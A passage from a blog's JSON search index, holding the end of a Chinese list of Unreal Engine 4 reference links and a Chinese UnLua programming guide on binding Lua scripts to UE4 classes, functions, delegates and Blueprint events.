gine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSUserGuide/\n\n12.场景查询系统节点参考：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/\n\n13.EQS节点参考：生成器：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceGenerators/\n\n14.EQS节点参考：测试：https://docs.unrealengine.com/4.26/zh-CN/InteractiveExperiences/ArtificialIntelligence/EQS/EQSNodeReference/EQSNodeReferenceTests/\n\nService、Task、Decorator节点重载函数介绍：https://blog.csdn.net/u010385624/article/details/89339958\n\n\nGameplay框架详细讲解：\n1.Actor和Component：https://zhuanlan.zhihu.com/p/22833151\n\n2.Level和World：https://zhuanlan.zhihu.com/p/22924838\n\n3.WorldContext，GameInstance，Engine：https://zhuanlan.zhihu.com/p/23167068\n\n4.Pawn：https://zhuanlan.zhihu.com/p/23321666\n\n5.Controller：https://zhuanlan.zhihu.com/p/23480071\n\n6.PlayerController和AIController：https://zhuanlan.zhihu.com/p/23649987\n\n7.GameMode和GameState：https://zhuanlan.zhihu.com/p/23707588\n\n8.Player：https://zhuanlan.zhihu.com/p/23826859\n\n9.GameInstance：https://zhuanlan.zhihu.com/p/24005952\n\n10.总结：https://zhuanlan.zhihu.com/p/24170697\n\n\nUObject详解：\n1.开篇https://zhuanlan.zhihu.com/p/24319968\n\n\n\n\n\n\n容器：\n数组TArray：https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TArrays/\n\n映射TMap：https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TMap/\n\n集合TSet：https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSet/\n\n\n杂项：\nTSubClassOf：https://docs.unrealengine.com/4.26/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/TSubclassOf/\n\nCast原理：https://blog.csdn.net/zzk1995/article/details/49877469/\n\nUE4性能优化：https://blog.csdn.net/qq_42145322/article/details/100924919\n\n智能指针：https://blog.csdn.net/qq_39481248/article/details/118966678\n\n智能指针使用技巧：https://blog.csdn.net/qq_29667889/article/details/109308111\n\n关闭创建类时编译：https://zhuanlan.zhihu.com/p/370211758\n\nTWeakObjectPtr的使用：https://zhuanlan.zhihu.com/p/139473097\n\nTWeakObjectPtr相关分析杂谈：https://zhuanlan.zhihu.com/p/68376750\n\n\n","slug":"San_Passage","date":"2021-08-28T17:02:00.000Z","categories_index":"程序","tags_index":"教学文档,UE4","author_index":"Arvin"},{"id":"c4376d974567342d893650726b4846c5","title":"Lua讲解","content":"概述UnLua是一个功能丰富并且高效的UE4脚本编程解决方案。开发者可以使用Lua来开发游戏逻辑，并且它允许我们利用Lua的热加载功能来更快地更新游戏逻辑。这份文档将会介绍UnLua的主要功能以及最基础的编程模式。\n\nLua和引擎的绑定UnLua提供了一种简单的方法将Lua和游戏引擎相互绑定，包括静态绑定和动态绑定：\n静态绑定C++你的UCLASS只需要实现接口IUnLuaInterface，并在函数**GetModuleName_Implementation()**中返回一个Lua文件路径。\n蓝图你的蓝图只需要实现接口UnLuaInterface，并在函数**GetModuleName()**中返回一个Lua文件路径。\n动态绑定动态绑定适用于运行时创建AActor和UObject\nActorlocal Proj &#x3D; World:SpawnActor(ProjClass, Transform, ESpawnActorCollisionHandlingMethod.AlwaysSpawn, self, self.Instigator, &quot;Weapon.BP_DefaultProjectile_C&quot;)\n“Weapon.BP_DefaultProjectile_C”是一个Lua文件路径.\nObjectlocal ProxyObj &#x3D; NewObject(ObjClass, nil, nil, &quot;Objects.ProxyObject&quot;)\n“Objects.ProxyObject”是一个Lua文件路径.\nLua文件路径不论是静态绑定还是动态绑定都需要一个Lua文件路径。它是项目目录**’Content&#x2F;Script’的相对**路径。\n\nLua调用引擎UnLua提供了两种从Lua端访问引擎的方法：\n\n使用反射系统动态导出；\n在反射系统外部静态导出类、成员变量、成员函数、全局函数和枚举。\n\n使用反射系统动态导出利用反射系统进行动态导出，使代码简洁、直观，消除了大量的胶水代码。\n访问UCLASSlocal Widget &#x3D; UWidgetBlueprintLibrary.Create(self, UClass.Load(&quot;&#x2F;Game&#x2F;Core&#x2F;UI&#x2F;UMG_Main&quot;))\nUWidgetBlueprintLibrary 是一个UCLASS。类在Lua里的名称必须是 PrefixCPP + ClassName + **[_C]**，例如： AActor (原生类)， ABP_PlayerCharacter_C（蓝图类）\n访问UFUNCTIONWidget:AddToViewport(0)\nAddToViewport 是 UUserWidget 的一个UFUNCTION。 0 是函数的参数。如果（被标记为 ‘BlueprintCallable’ 或 **’Exec’**的）UFUNCTION的参数拥有默认值，那在Lua代码中可以忽略参数0：\nWidget:AddToViewport()\n\n输出值处理输出值包括 非常量引用参数 and 返回值参数。这些输出值分为 原生类型（bool, integer, number, string） 和 非原生类型 （用户自定义数据）。\n非常量引用参数原生类型Lua代码：\nlocal Level, Health, Name &#x3D; self:GetPlayerBaseInfo()\n\n非原生类型他们在Lua中有两种调用的方法：\nlocal HitResult &#x3D; FHitResult()\nself:GetHitResult(HitResult)\n或\nlocal HitResult &#x3D; self:GetHitResult()\n第一种方法和C++极为相似，当调用多次（比如在循环中）时，它比第二种方法效率高得多。\n返回值参数原生类型Lua代码：\nlocal MeleeDamage &#x3D; self:GetMeleeDamage()\n\n非原生类型他在Lua中有三种调用方式：\nlocal Location &#x3D; self:GetCurrentLocation()\n或者\nlocal Location &#x3D; FVector()\nself:GetCurrentLocation(Location)\n以及\nlocal Location &#x3D; FVector()\nlocal LocationCopy &#x3D; self:GetCurrentLocation(Location)\n第一种方法最为直观，事实上，当调用多次（比如在循环中）时，后两种方法要比第一种方法效率高得多。最后一种方法等价于：\nlocal Location &#x3D; FVector()\nself:GetCurrentLocation(Location)\nlocal LocationCopy &#x3D; Location\n\n潜在功能潜在功能允许开发人员使用同步调用风格开发异步逻辑。一个典型的潜在功能例子是Delay：\n你可以在Lua协程中调用潜在功能：\ncoroutine.resume(\n\tcoroutine.create(\n    \tfunction(GameMode, Duration)\n        \tUKismetSystemLibrary.Delay(GameMode, Duration)\n        end\n    ), self, 5.0\n)\n\n优化UnLua对UFUNCTION的调用进行了以下几点优化：\n\n持久的缓冲参数\n优化局部函数调用\n优化参数传递\n优化输出值处理\n\n访问USTRUCTlocal Position &#x3D; FVector()\nFVector 是一个USTRUCT。\n访问UPROPERTYlocal Position &#x3D; FVector()\nPosition.X &#x3D; 256.0\nX 是 FVector 的一个UPROPERTY。\n代理\n绑定\nFloatTrack.InterpFunc:Bind(self, BP_PlayerCharacter_C.OnZoomInOutUpdate)\nInterpFunc 是 FTimelineFloatTrack 的代理， ‘Bind’ 为 InterpFunc 绑定了一个回调函数 （BP_PlayerCharacter_C.OnZoomInOutUpdate）。\n\n解除绑定\nFloatTrack.InterpFunc:Unbind()\nInterpFunc 是 FTimelineFloatTrack 的代理， ‘Unbind’ 解除了 InterpFunc 所绑定的回调函数。\n\n执行\nFloatTrack.InterpFunc:Execute(0.5)\nInterpFunc 是 FTimelineFloatTrack 的代理， ‘Execute’ 调用了绑定到InterpFunc对象上的函数。\n\n\n多播代理\n添加\nself.ExitButton.OnClicked:Add(self, UMG_Main_C.OnClicked_ExitButton)\nOnClicked 是 UButton 的一个多播代理，**’Add’** 为 OnClicked 添加了一个回调（UMG_Main_C.OnClicked_ExitButton）。\n\n移除\nself.ExitButton.OnClicked:Remove(self, UMG_Main_C.OnClicked_ExitButton)\nOnClicked 是 UButton 的一个多播代理，**’Remove’** 在 OnClicked 上移除了一个回调（UMG_Main_C.OnClicked_ExitButton）。\n\n清除\nself.ExitButton.OnClicked:Clear()\nOnClicked 是 UButton 的一个多播代理，**’Clear’** 清除了在 OnClicked 上的所有回调。\n\n广播\nself.ExitButton.OnClicked:Broadcast()\nOnClicked 是 UButton 的一个多播代理，**’Broadcast’** 调用了所有绑定在 OnClicked 对象上的函数。\n\n\n访问UENUMWeapon:K2_AttachToComponent(Point, nil, EAttachmentRule.SnapToTarget, EAttachmentRule.SnapToTarget, EAttachmentRule.SnapToTarget)\nEAttachmentRule 是一个枚举，SnapToTarget 是一个 EAttachmentRule 类型的枚举值。\n自定义碰撞枚举\nEObjectTypeQuery\nlocal ObjectTypes &#x3D; TArray(EObjectTypeQuery)\nObjectTypes:Add(EObjectTypeQuery.Player)\nObjectTypes:Add(EObjectTypeQuery.Enemy)\nObjectTypes:Add(EObjectTypeQuery.Projectile)\nlocal bHit &#x3D; UKismetSystemLibrary.LineTraceSingleForObjects(self, Start, End, ObjectTypes, false, nil, EDrawDebugTrace.None, HitResult, true)\nEObjectTypeQuery.Player，EObjectTypeQuery.Enemy 以及 EObjectTypeQuery.Projectile 都是自定义对象通道。\n\nETraceTypeQuery\nlocal bHit &#x3D; UKismetSystemLibrary.LineTraceSingle(self, Start, End, ETraceTypeQuery.Weapon, false, nil, EDrawDebugTrace.None, HitResult, true)\nETraceTypeQuery.Weapon 是一个自定义跟踪通道。\n\n\n手动导出库出于灵活性与性能考虑，UnLua在引擎中手动导出了几个重要的类，包括以下（详见代码）：\n基础类\nUObject\nUClass\nUWorld\n\n常见容器\nTArray\nTSet\nTMap\n\n示例local Indices &#x3D; TArray(0)\nIndices:Add(1)\nIndices:Add(3)\nIndices:Remove(0)\nlocal NbIndices &#x3D; Indices:Length()\nlocal Vertices &#x3D; TArray(FVector)\nlocal Actors &#x3D; TArray(AActor)\n\n数学库\nFVector\nFVector2D\nFVector4\nFQuat\nFRotator\nFTransform\nFColor\nFLinearColor\nFIntPoint\nFIntVector\n\n静态导出UnLua提供了一个简单的解决方案，可以在反射系统外部静态地导出类、成员变量、成员函数、全局函数和枚举。\n类\n没有反射的类\nBEGIN_EXPORT_CLASS(ClassType, ...)\n或者\nBEGIN_EXPORT_NAMED_CLASS(ClassName, ClassType, ...)\n ‘…’ 表示构造函数中参数的类型列表。\n\n有反射的类\nBEGIN_EXPORT_REFLECTED_CLASS(UObjectType)\n或者\nBEGIN_EXPORT_REFLECTED_CLASS(NonUObjectType, ...)\n ‘…’ 表示构造函数中参数的类型列表。\n\n\n成员变量ADD_PROPERTY(Property)\n或者（用于bitfield的bool属性）\nADD_BITFIELD_BOOL_PROPERTY(Property)\n\n成员函数非静态成员函数\n紧凑型风格\nADD_FUNCTION(Function)\n或者\nADD_NAMED_FUNCTION(Name, Function)\n\n完全型风格\nADD_FUNCTION_EX(Name, RetType, Function, ...)\n 或者\nADD_CONST_FUNCTION_EX(Name, RetType, Function, ...)\n ‘…’ 为参数类型列表。\n\n\n静态成员函数ADD_STATIC_FUNCTION(Function)\n或者\nADD_STATIC_FUNCTION_EX(Name, RetType, Function, ...)\n‘…’ 为参数类型列表。\n示例struct Vec3\n&#123;\n\tVec3() : x(0), y(0), z(0) &#123;&#125;\n\tVec3(float _x, float _y, float _z) : x(_x), y(_y), z(_z) &#123;&#125;\n\n\tvoid Set(const Vec3 &amp;V) &#123; *this &#x3D; V; &#125;\n\tVec3&amp; Get() &#123; return *this; &#125;\n\tvoid Get(Vec3 &amp;V) const &#123; V &#x3D; *this; &#125;\n\n\tbool operator&#x3D;&#x3D;(const Vec3 &amp;V) const &#123; return x &#x3D;&#x3D; V.x &amp;&amp; y &#x3D;&#x3D; V.y &amp;&amp; z &#x3D;&#x3D; V.z; &#125;\n\n\tstatic Vec3 Cross(const Vec3 &amp;A, const Vec3 &amp;B) &#123; return Vec3(A.y * B.z - A.z * B.y, A.z * B.x - A.x * B.z, A.x * B.y - A.y * B.x); &#125;\n\tstatic Vec3 Multiply(const Vec3 &amp;A, float B) &#123; return Vec3(A.x * B, A.y * B, A.z * B); &#125;\n\tstatic Vec3 Multiply(const Vec3 &amp;A, const Vec3 &amp;B) &#123; return Vec3(A.x * B.x, A.y * B.y, A.z * B.z); &#125;\n\n\tfloat x, y, z;\n&#125;;\n\nBEGIN_EXPORT_CLASS(Vec3, float, float, float)\n\tADD_PROPERTY(x)\n\tADD_PROPERTY(y)\n\tADD_PROPERTY(z)\n\tADD_FUNCTION(Set)\n\tADD_NAMED_FUNCTION(&quot;Equals&quot;, operator&#x3D;&#x3D;)\n\tADD_FUNCTION_EX(&quot;Get&quot;, Vec3&amp;, Get)\n\tADD_CONST_FUNCTION_EX(&quot;GetCopy&quot;, void, Get, Vec3&amp;)\n\tADD_STATIC_FUNCTION(Cross)\n\tADD_STATIC_FUNCTION_EX(&quot;MulScalar&quot;, Vec3, Multiply, const Vec3&amp;, float)\n\tADD_STATIC_FUNCTION_EX(&quot;MulVec&quot;, Vec3, Multiply, const Vec3&amp;, const Vec3&amp;)\nEND_EXPORT_CLASS()\nIMPLEMENT_EXPORTED_CLASS(Vec3)\n\n全局函数EXPORT_FUNCTION(RetType, Function, ...)\n或者\nEXPORT_FUNCTION_EX(Name, RetType, Function, ...)\n‘…’ 为参数类型列表。\n示例void GetEngineVersion(int32 &amp;MajorVer, int32 &amp;MinorVer, int32 &amp;PatchVer)\n&#123;\n\tMajorVer &#x3D; ENGINE_MAJOR_VERSION;\n\tMinorVer &#x3D; ENGINE_MINOR_VERSION;\n\tPatchVer &#x3D; ENGINE_PATCH_VERSION;\n&#125;\n\nEXPORT_FUNCTION(void, GetEngineVersion, int32&amp;, int32&amp;, int32&amp;)\n\n枚举\n普通枚举\n\nenum EHand\n&#123;\n\tLeftHand,\n\tRightHand\n&#125;;\n\nBEGIN_EXPORT_ENUM(EHand)\n\tADD_ENUM_VALUE(LeftHand)\n\tADD_ENUM_VALUE(RightHand)\nEND_EXPORT_ENUM(EHand)\n\n\n作用域为类的枚举\n\nenum class EEye\n&#123;\n\tLeftEye,\n\tRightEye\n&#125;;\n\nBEGIN_EXPORT_ENUM(EEye)\n\tADD_SCOPED_ENUM_VALUE(LeftEye)\n\tADD_SCOPED_ENUM_VALUE(RightEye)\nEND_EXPORT_ENUM(EEye)\n\n可选“UE4”名称空间UnLua提供了一个选项来添加一个命名空间**’UE4’到引擎中的所有类和枚举。你可以在UnLua.Build.cs**中找到这个选项。\n如果这个选项被开启，你的Lua代码应该是这样子：\nlocal Position &#x3D; UE4.FVector()\n\n\n引擎调用LuaUnLua提供了一个类似蓝图的解决方案来跨越C++&#x2F;Script的边界。它允许C++&#x2F;Blueprint代码调用在Lua代码中定义的函数。\n覆写蓝图事件你可以在Lua代码里覆写所有的蓝图事件。蓝图事件包括：\n\n被标记为 ‘BlueprintImplementableEvent’ 的UFUNCTION\n被标记为 ‘BlueprintNativeEvent’ 的UFUNCTION\n所有定义在蓝图里的事件或函数\n\n示例（没有返回值的蓝图事件）你可以在Lua中这样覆写它：\nfunction BP_PlayerController_C:ReceiveBeginPlay()\n  print(&quot;ReceiveBeginPlay in Lua!&quot;)\nend\n\n示例（有返回值的蓝图事件）在Lua中有两种覆写它的方式：\nfunction BP_PlayerCharacter_C:GetCharacterInfo(HP, Position, Name)\n\tPosition.X &#x3D; 128.0\n\tPosition.Y &#x3D; 128.0\n\tPosition.Z &#x3D; 0.0\n\treturn 99, nil, &quot;Marcus&quot;, true\nend\n或者\nfunction BP_PlayerCharacter_C:GetCharacterInfo(HP, Position, Name)\n\treturn 99, FVector(128.0, 128.0, 0.0), &quot;Marcus&quot;, true\nend\n推荐第一种方式。\n覆写动画通知动画通知：\nLua代码：\nfunction ABP_PlayerCharacter_C:AnimNotify_NotifyPhysics()\n\tUBPI_Interfaces_C.ChangeToRagdoll(self.Pawn)\nend\nLua的函数名称必须是 ‘AnimNotify_’ + 通知名称。\n覆写输入事件操作输入function BP_PlayerController_C:Aim_Pressed()\n\tUBPI_Interfaces_C.UpdateAiming(self.Pawn, true)\nend\n\nfunction BP_PlayerController_C:Aim_Released()\n\tUBPI_Interfaces_C.UpdateAiming(self.Pawn, false)\nend\nLua的函数名称必须是 操作输入名称 + **’_Pressed’ 或者 ‘_Released’**。\n轴输入function BP_PlayerController_C:Turn(AxisValue)\n\tself:AddYawInput(AxisValue)\nend\n\nfunction BP_PlayerController_C:LookUp(AxisValue)\n\tself:AddPitchInput(AxisValue)\nend\nLua的函数名称必须是与 轴输入名称 一模一样。\n键盘输入function BP_PlayerController_C:P_Pressed()\n\tprint(&quot;P_Pressed&quot;)\nend\n\nfunction BP_PlayerController_C:P_Released()\n\tprint(&quot;P_Released&quot;)\nend\nLua的函数名称必须是 按键名称 + **’_Pressed’ 或者 ‘_Released’**。\n其他输入你也可以在Lua中覆写 Touch&#x2F;AxisKey&#x2F;VectorAxis&#x2F;Gesture Inputs。\n覆写复制通知如果你正在开发专用&#x2F;侦听服务器&amp;客户端游戏，你可以在Lua代码中覆写复制通知：\nfunction BP_PlayerCharacter_C:OnRep_Health(...)\n\tprint(&quot;call OnRep_Health in Lua&quot;)\nend\n\n调用被覆写的函数如果你在Lua中覆写了一个蓝图事件、动画通知或者复制通知，你仍然可以访问原始函数实现。\nfunction BP_PlayerController_C:ReceiveBeginPlay()\n\tlocal Widget &#x3D; UWidgetBlueprintLibrary.Create(self, UClass.Load(&quot;&#x2F;Game&#x2F;Core&#x2F;UI&#x2F;UMG_Main&quot;))\n\tWidget:AddToViewport()\n\tself.Overridden.ReceiveBeginPlay(self)\nend\n\nself.Overridden.ReceiveBeginPlay(self) 将会调用蓝图实现的 ‘ReceiveBeginPlay’。\n在C++中调用Lua函数UnLua还提供了两种通用方法来调用全局Lua函数和C++代码中全局Lua表中的函数。\n\n全局函数\ntemplate &lt;typename... T&gt;\nFLuaRetValues Call(lua_State *L, const char *FuncName, T&amp;&amp;... Args);\n\n全局表中的函数\ntemplate &lt;typename... T&gt;\nFLuaRetValues CallTableFunc(lua_State *L, const char *TableName, const char *FuncName, T&amp;&amp;... Args);\n\n\n其他\nLua模板文件导出\n\n你可以在蓝图中生成Lua的模板文件\n模板文件：\n","slug":"UnLua_Programming_Guide_CN","date":"2021-08-28T17:02:00.000Z","categories_index":"程序","tags_index":"教学文档,程序开发,Lua,C++","author_index":"Arvin"}]